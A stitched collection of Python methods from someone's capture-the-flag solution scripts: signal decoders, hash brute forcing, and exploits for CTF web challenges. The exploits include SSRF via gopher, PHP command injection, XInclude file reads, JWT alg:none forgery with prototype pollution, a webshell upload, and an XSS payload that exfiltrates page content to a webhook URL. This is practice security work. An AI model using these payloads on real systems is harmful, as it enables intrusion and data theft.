        decoded = self.ascii_converter(decoded)
        print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def main(self):

        text = "011011101110000100111001000010010011111011110000"
        decoded = self.decode_nrz_i(text)
        decoded = self.ascii_converter(decoded)

        text = "100110010110101000011000111110011000101010"
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)
        # return

        text = "0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011"
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)

        #

        text = "001101010010100001101100011011001"
        start = time.time()
        text = "01010111011010000010010101011000101110110011000001010010011011101101111011001"
        decoded = self.decode_uart(text)

        decoded = self.ascii_converter(decoded)
        print(f"time: {time.time() - start}")
        # print(decoded)

        return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            self.getting_round()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def saving_requests(self):
        """
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        """

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) > 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil("data", "requests.json"), "r") as f:
            requests = json.load(f)
        with open(self.folfil("data", "requests.json"), "w") as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f"Saved {len(self.requests)} requests to data/requests.json")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def nrzi_formater_for_rest(self, bits: list):
        # padded_length = math.ceil(len(bits) / 8) * 8
        last_bits = len(bits) % 8
        if last_bits == 0:
            return bits

        valid_bits = bits[: len(bits) - last_bits]
        rest_of_bits = bits[len(bits) - last_bits :]
        print(
            f"Valid bits: {valid_bits}, Rest of bits: {rest_of_bits}, Last bits: {last_bits}"
        )
        rest_of_bits = [0] * (8 - last_bits) + rest_of_bits
        # Pad with zeros to make it a multiple of 8
        print(f"Rest of bits: {rest_of_bits}")

        return valid_bits + rest_of_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def nrzi_formater(self, bits: list):
        bits = [0] * (len(bits) % 8) + bits
        return bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def bits_to_ascii(self, bits):
        """
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        """
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError("Number of bits is not a multiple of 8")
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val << 1) | bit
            chars.append(chr(val))
        return "".join(chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_nrzi(self, bits: str) -> str:
        """
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        """

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        # Initial signal level
        current_level = encoded_bits[0]
        decoded_bits = []
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        # print(f"Decoded NRZI bits: {decoded_bits}")
        # print("".join([str(bit) for bit in decoded_bits]))
        # decoded_bits = self.nrzi_formater(decoded_bits)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_manchester(self, encoded_bits):
        """
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        '01' -> 0
        '10' -> 1
        """
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError("Manchester encoded bits length must be even")
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "01":
                decoded_bits.append(0)
            elif pair == "10":
                decoded_bits.append(1)
            else:
                raise ValueError(f"Invalid Manchester encoding pair: {pair}")
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_hamming74(self, encoded_bits):
        """
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        """

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 << 2) | (s2 << 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError("Hamming (7,4) encoded bits length must be multiple of 7")
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        """
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        """
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                "UART encoded bits length is not a multiple of frame length"
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError("Invalid start bit in UART frame")
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError("Invalid stop bit(s) in UART frame")
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit << idx
            decoded_chars.append(chr(val))
        return "".join(decoded_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def getting_round(self):
        round_text = self.recv_until("> ")
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        print(round_text)
        self.requests.append(round_text)
        # print(self.requests)
        # print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
            # raise ValueError("Unexpected round format or missing data")
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
        print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def main(self):

        self.requests = []

        # text = "011011101110000100111001000010010011111011110000"
        # text = "001011111001100110010011100000111010010110100011"
        # text = "010010000110001110110000"
        # text = "100010001010101000"
        # decoded_result = "110110101010101011"
        # text = "001000111000100001001010"
        # decoded = self.decode_nrzi(text)
        # print(decoded)

        # return
        # text = "100110010110101000011000111110011000101010"
        # decoded = self.decode_hamming74(text)
        # # return

        # text = "0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011"
        # decoded = self.decode_hamming74(text)

        # #

        # text = "001101010010100001101100011011001"
        # text = "01110110011"
        # start = time.time()
        # # text = "01010111011010000010010101011000101110110011000001010010011011101101111011001"
        # test = "0110001100101110111001011101110010110001100100000101001"

        # print(f"time: {time.time() - start} - Decoded: {decoded}")
        # # print(decoded)

        # test = "01110011011000001010010111011100100010011011000010110110010110100100101111011"
        # 0 11100110 1 1
        # 0 00001010 0 1
        # 0 11101110 0 1
        # 0 00100110 1 1
        # 0 00010110 1 1
        # 0 01011010 0 1
        # 0 01011110 1 1

        # for i in range(len(test) // 11):
        #     print(
        #         f"start: {test[i*11]} | bits: {test[i*11 + 1:(i*11)+8 + 1]} | parity: {test[i*11 + 9 ]} | stop: {test[i*11 + 10]}"
        #     )

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f"Error in round {i}: {e}")
                break

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Blackjack/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def initiate_connection(self):
        self.client = ModbusTcpClient(self.url, port=self.port)
        self.client.connect()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def bruteforce_address(self, start=0, number=1000, count=125, verbose=False):
        if start > number:
            raise ValueError(
                "Start address must be less than the number of addresses to check."
            )
        for i in range(start, number):
            result = self.client.read_holding_registers(address=i, count=count)

            if any(result.registers) and result.registers[-1] == 0:
                return i
            if verbose:
                print(f"Reading holding registers at address {i}...")
                if not result.isError():
                    print("Registers:", result.registers)
                else:
                    print("Error reading registers:", result)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def get_registers(self, address, count=125):
        result = self.client.read_holding_registers(address=address, count=count)
        if not result.isError():
            return result.registers
        else:
            print("Error reading registers:", result)
            return None

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def main(self):
        self.initiate_connection()
        address = self.bruteforce_address(verbose=True)
        print(address)  # 935
        registers = self.get_registers(address)
        flag = "".join(chr(r) for r in registers if r != 0)
        print(flag)
        self.client.close()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def socket_initiate_connection(self):

        with socket.create_connection((self.url, self.port), timeout=10) as s:
            # Receive initial banner or prompt
            data = s.recv(4096)
            print("Received:", data.decode(errors="ignore"))

            # Example: send a newline or command if required by the challenge
            s.sendall(b"\n")
            response = s.recv(4096)
            print("Response:", response.decode(errors="ignore"))

            # Try common commands if it's a text interface
            for cmd in [b"status\n", b"secret\n", b"help\n", b"info\n"]:
                s.sendall(cmd)
                resp = s.recv(4096)
                print(f"Sent {cmd.strip().decode()}: {resp.decode(errors='ignore')}")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def plc_initiate_connection(self):
        # try:
        with LogixDriver("challenge.hackthat.site/55373") as plc:
            print("Connected to PLC")
            tag_value = plc.read("Flag")
            print(f"Flag value: {tag_value}")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def snap_initiate_connection(self):
        self.client = Client()
        self.client.connect(self.url, self.port)
        result = self.client.read_area(
            area=snap7_util.snap7.types.Areas.DB, db_number=1, start=0, size=100
        )
        print(result)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def plc_work(self, solution, plc):

        print(plc.get_tags())

        return

        tag = LogixTag(name="Flag", tag_type=LogixTagType.STRING)
        plc.add_tag(tag)

        # Read the flag from the PLC
        flag = plc.read("Flag")
        if flag:
            print(f"Flag: {flag.value}")
        else:
            print("Failed to read the flag from PLC")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def main(self):
        self.plc_initiate_connection()

	# /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def __init__(self, conn: str, file: str, url: str, port: str, **args):
        super().__init__(conn, file, url, port)
        self.pwn.context.log_level = "error"
        self.ip = args.HOST
        self.rpc_port = args.RPC_PORT
        self.tcp_port = args.TCP_PORT
        self.RPC_URL = f"http://{self.ip}:{int(self.rpc_port)}/"
        self.tcp_url = f"{self.ip}:{int(self.tcp_port)}"

	# /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def main(self):

        # self.initiate_connection()

        connection_info = {}

        # connect to challenge handler and get connection info
        with self.pwn.remote(
            self.TCP_URL.split(":")[0], int(self.TCP_URL.split(":")[1])
        ) as p:
            p.sendlineafter(b"action? ", b"1")
            data = p.recvall()

        lines = data.decode().split("\n")
        for line in lines:
            if line:
                key, value = line.strip().split(" :  ")
                connection_info[key] = value

        print(connection_info)
        self.pvk = connection_info["Private key    "]
        self.setup = connection_info["Setup contract "]
        target = connection_info["Target contract"]

        while True:
            # try luck
            self.csend(target, "pullTrigger()")

            # get flag
            with self.pwn.remote(
                self.TCP_URL.split(":")[0], int(self.TCP_URL.split(":")[1])
            ) as p:
                p.recvuntil(b"action? ")
                p.sendline(b"3")
                flag = p.recvall().decode()

            if "HTB" in flag:
                print(f"\n\n[*] {flag}")
                break

	# /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def csend(self, contract: str, fn: str, *args):
        print(
            f"cast send {contract} '{fn}' --rpc-url  {self.RPC_URL} --private-key {self.pvk}"
        )
        system(
            f"cast send {contract} '{fn}' --rpc-url {self.RPC_URL} --private-key {self.pvk}"
        )

	# /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def reconstructing_url(self):
        self.complete_url = f"http://{self.url}:{self.port}"

	# /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def send_file(self, file):
        url = self.complete_url + "/upload"
        with open(file, "rb") as f:
            files = {"file": f}
            response = requests.post(url, files=files)
        if response.status_code == 200:
            return response.json()
        else:
            return response.text

	# /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def get_request(self, path):
        url = "/".join([self.complete_url, path])
        response = requests.get(url)
        if response.status_code == 200:
            # return response.json()
            return response.text
        else:
            return response.text

	# /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def main(self):
        self.reconstructing_url()
        # robots = self.get_request("robots.txt")
        # print(robots)
        # instructions = self.get_request("instructions.txt")
        # print(instructions)
        payload = self.Path(self.folder_payloads, "webshell.png.php")
        self.send_file(payload)

	# /home/figaro/CTF/Categories/Web/bsides/PageOneHTML/payloads/solution.py
    def main(self):

        url = "http://94.237.59.174:59356/api/convert"
        headers = {"Content-Type": "application/json"}
        data = {
            # "markdown_content": "![flag](gopher://127.0.0.1:80/_GET /api/dev HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aX-Api-Key:934caf984a4ca94817ea6d87d37af4b3%0d%0a%0d%0a)",
            # "markdown_content": "![test](http://127.0.0.1/)",
            "markdown_content": "![flag](gopher://127.0.0.1:80/_GET%20/api/dev%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aX-Api-Key:934caf984a4ca94817ea6d87d37af4b3%0d%0a%0d%0a)",
            "port_images": True,
        }

        response = requests.post(url, json=data, headers=headers)
        if response.status_code == 200:
            print("Request successful!")
            print(response.json())
        else:
            print(f"Request failed with status code: {response.status_code}")
            print(response.text)

	# /home/figaro/CTF/Categories/Web/bsides/SimPlay/payloads/solution.py
    def main(self):
        url = f"http://{self.url}:{self.port}"  # Replace with actual challenge IP or domain
        payload = 'Y-m-d"; system("cat /www/flag"); //'
        payload = 'Y-m-d"); system("ls /"); //'
        payload = 'Y-m-d"); system("cat /flagxTtZD"); //'
        r = requests.get(url, params={"format": payload})
        print(r.text)

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def main(self):
        self.new_url = f"http://{self.url}:{self.port}/api/generate"
        self.generating()

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def generating(self):

        exploit = f"""</text><text x=\"10\" y=\"50\" font-size=\"20\" fill=\"black\" xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\".?../../../../app/flag.txt\" parse=\"text\"/></text><text>
                """

        payload = {
            "name": "everywhere",
            "topText": exploit,
            "bottomText": "lol",
        }

        headers = {"Content-Type": "application/json"}

        response = requests.post(self.new_url, json=payload, headers=headers)

        if response.status_code == 200 and "result" in response.json():
            self.meme = response.json()["result"]
            self.meme_url = f"http://{self.url}:{self.port}/{self.meme}"
            print(self.meme_url)

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def downloading(self):
        if not hasattr(self, "meme_url"):
            print("Meme not generated. Please run the generating step first.")
            return
        response = requests.get(self.meme_url)
        meme_name = self.meme.split("/")[-1]
        if response.status_code == 200:
            with open(self.folfil("data", meme_name), "wb") as f:
                f.write(response.content)
            print("Meme downloaded successfully.")
        else:
            print("Failed to download the meme.")

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def main(self):
        self.new_url = f"http://{self.url}:{self.port}/api/generate"
        self.generating()

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def generating(self):

        # exploit = """M</text><image x="0" y="250" width="500" height="250" href="file:///app/flag.txt"/><text x="50%" y="45" font-size="40" fill="blue" stroke="red">A"""

        # filename = "static/memes/doge.png"

        # exploit = f"""M</text><image x="10" y="0" width="50" height="50" href="file://{filename}"/><text x="50%" y="45" font-size="40" fill="blue" stroke="red">A"""

        online_meme_url = f"http://{self.url}:{self.port}/memes/doge"

        # exploit = f"""M</text><image x="0" y="0" width="500" height="250" href="{online_meme_url}"/><text x="50%" y="45" font-size="40" fill="red" stroke="red">A"""

        # filename = "/flag.txt"
        # filename = base64.b64encode(filename.encode()).decode()
        # data:image/png;base64,
        # exploit = f"""M</text><g id="foreground"><image x="0" y="0" width="50" height="50" href="data:image/png;base64,{filename}"/></g><text x="50%" y="45"  fill="blue" stroke="red">A"""
        # exploit = f"""M</text><image x="0" y="0" width="50" height="50" href="data:image/png;base64,{filename}"/><text x="50%" y="45"  fill="blue" stroke="red">A"""
        # exploit = f"""M</text><image x="0" y="0" width="50" height="50" href="data:image/png;base64,{filename}"/><text y="45">A"""

        filename = "/flag.txt"

        # exploit = f"""</text><foreignObject><iframe  src="file://{filename}"/></foreignObject><text y="45">A"""
        exploit = f"""</text><foreignObject><iframe  src="{online_meme_url}"/></foreignObject><text y="45">A"""

        # exploit = f"""M</text><g id="foreground"><image x="0" y="0" width="50" height="50" href="data:image/png;base64,{filename}"/></g><text x="50%" y="45"  fill="blue" stroke="red">A"""

        print(len(exploit))
        print(exploit)

        payload = {
            "name": "everywhere",
            # "name": "doge",
            "topText": "lol",
            "bottomText": exploit,
        }

        headers = {"Content-Type": "application/json"}

        response = requests.post(self.new_url, json=payload, headers=headers)

        if response.status_code == 200 and "result" in response.json():
            self.meme = response.json()["result"]
            self.meme_url = f"http://{self.url}:{self.port}/{self.meme}"
            print(self.meme_url)

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def downloading(self):
        if not hasattr(self, "meme_url"):
            print("Meme not generated. Please run the generating step first.")
            return
        response = requests.get(self.meme_url)
        meme_name = self.meme.split("/")[-1]
        if response.status_code == 200:
            with open(self.folfil("data", meme_name), "wb") as f:
                f.write(response.content)
            print("Meme downloaded successfully.")
        else:
            print("Failed to download the meme.")

	# /home/figaro/CTF/Categories/Web/ECSC/Popcorn_and_Payloads/payloads/solution.py
    def main(self):
        self.completed_url = f"http://{self.url}:{self.port}"

	# /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def create_token(self, username):
        header = {"alg": "none", "typ": "JWT"}
        return jwt.encode(
            {"username": username}, key=None, algorithm="none", headers=header
        )

	# /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def pollute(self, base_url):
        payload = {
            "user.username": "nikolas",
            "user.password": "nikolas",
            "user.__proto__.payloads": ["none"],
            "user.__proto__.authKeyFile": True,
        }
        r = requests.post(f"{base_url}/api/register", json=payload)

	# /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def main(self):
        self.base_url = f"http://{self.url}:{self.port}"
        cookie = self.create_token("admin")
        headers = {"Cookie": f"session={cookie}"}
        print(cookie)
        self.pollute(self.base_url)
        req = requests.get(f"{self.base_url}/panel", headers=headers)
        flag = self.re_match_partial_flag(text=req.text, origin="ECSC")
        print(flag)

	# /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def generate_payload(self, attacker_url):
        payload = """
        <script>
        const iframe = document.createElement('iframe');
        iframe.srcdoc = `
        <script>
        window.parent.postMessage({
            style: {
            "webkitUserModify": "read-write"
            }
        }, '*');
        <\\/script>
    `;
        document.body.appendChild(iframe);

        setTimeout(() => {
            window.find('Here');
            document.execCommand('insertHTML', false, `<img src=x onerror="fetch('EXFIL_URL'+this.parentElement.outerHTML)">`)
        }, 1000);
        </script>
        """.replace(
            "EXFIL_URL", attacker_url
        )

        return payload

	# /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def generate_url(self, attacker_url, payload):
        """
        Description:
            Generate a URL with the given attacker URL and payload.

        Args:
            attacker_url (_type_): _description_
            payload (_type_): _description_

        Returns:
            _type_: _description_
        """
        base_url = "http://localhost/index.php"

        parsed_url = urllib.parse.quote(payload)
        print(parsed_url)
        params_suffix = "&p=1" * 1500
        return f"{base_url}?xss={parsed_url}{params_suffix}"

	# /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def send_to_bot(self, payload_url):
        """
        Description:
            Send the payload URL to the bot.

        Args:
            payload_url (_type_): _description_

        Returns:
            _type_: _description_
        """
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {"url": payload_url}
        response = requests.post(self.bot_url, headers=headers, data=data)
        return response.text

	# /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def main(self):
        self.url_ful = f"http://{self.url}:{self.port}"
        self.base_url = f"{self.url_ful}/index.php"
        self.bot_url = f"{self.url_ful}/bot.php"

        attacker_url = "https://webhook.site/73ea9e99-e3cc-4b42-a040-4c7c107406b6?leak="
        payload = self.generate_payload(attacker_url)
        payload_url = self.generate_url(attacker_url, payload)
        response = self.send_to_bot(payload_url)
        print(response)

	# /home/figaro/CTF/Categories/General/picoCTF/SansAlpha/payloads/solution.py
    def main(self):
        user = "ctf-player"
        host = "mimas.picoctf.net"
        port = 50399
        password = "6dd28e9b"

        self.conn = self.pwn.ssh(user, host, port, password)

        # print(repr(self.conn("ls")))
        self.conn.interactive("/bin/sh")

	# /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def main(self):
        self.password = "8a707622"
        self.user = "ctf-player"
        self.host = "saturn.picoctf.net"
        self.port = 54157

        self.ssh_connect(
            user=self.user, host=self.host, port=self.port, password=self.password
        )
        self.interactive()

	# /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def ssh_connect(self, **kwargs):
        """
        Descrption : Establish SSH connection
        Parameters :
            - user : username
            - host : hostname
            - port : port number
            - password : password

        Returns : None
        """
        user = kwargs.get("user", self.user)
        host = kwargs.get("host", self.host)
        port = kwargs.get("port", self.port)
        password = kwargs.get("password", self.password)

        if any([user is None, host is None, port is None, password is None]):
            raise "Invalid SSH connection parameters"
            return

        self.ssh_connection = self.pwn.ssh(user, host, port, password)

	# /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def interactive(self):
        """
        Descrption : Start an interactive session
        Parameters : None
        Returns : None
        """
        self.ssh_connection.interactive()

	# /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def from_hex(self, hex_string):
        return bytes.fromhex(hex_string).decode("utf-8")

	# /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def hex_to_string(self, hex_string):
        """
        Description: Convert hex string to ascii string

        Analytical:
        - Split the hex string by space
        - Convert each hex value to ascii character
        - Join the ascii characters to form the ascii string

        Args:
            hex_string (str): Hex string to convert to ascii

        Returns:
            str: Ascii string
        """
        hex_string = hex_string.split(" ")
        return "".join([chr(int(i, 16)) for i in hex_string])

	# /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def main(self):
        with open(self.challenge_file, "r") as f:
            data = f.read().strip()

        flag = self.hex_to_string(data)

        print(flag)

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) < len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return "".join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def main(self):
        dictionary = self.Path(self.folder_files, "dictionary.txt")
        with open(dictionary, "r") as f:
            self.pos_pw_list = f.read().splitlines()
        file_hash = self.Path(self.folder_files, "level5.hash.bin")
        with open(file_hash, "rb") as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, "rb") as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) < len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return "".join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def main(self):
        self.pos_pw_list = ["8799", "d3ab", "1ea2", "acaf", "2295", "a9de", "6f3d"]
        file_hash = self.Path(self.folder_files, "level3.hash.bin")
        with open(file_hash, "rb") as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, "rb") as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) < len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return "".join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def main(self):
        self.pos_pw_list = [
            "158f",
            "1655",
            "d21e",
            "4966",
            "ed69",
            "1010",
            "dded",
            "844c",
            "40ab",
            "a948",
            "156c",
            "ab7f",
            "4a5f",
            "e38c",
            "ba12",
            "f7fd",
            "d780",
            "4f4d",
            "5ba1",
            "96c5",
            "55b9",
            "8a67",
            "d32b",
            "aa7a",
            "514b",
            "e4e1",
            "1230",
            "cd19",
            "d6dd",
            "b01f",
            "fd2f",
            "7587",
            "86c2",
            "d7b8",
            "55a2",
            "b77c",
            "7ffe",
            "4420",
            "e0ee",
            "d8fb",
            "d748",
            "b0fe",
            "2a37",
            "a638",
            "52db",
            "51b7",
            "5526",
            "40ed",
            "5356",
            "6ad4",
            "2ddd",
            "177d",
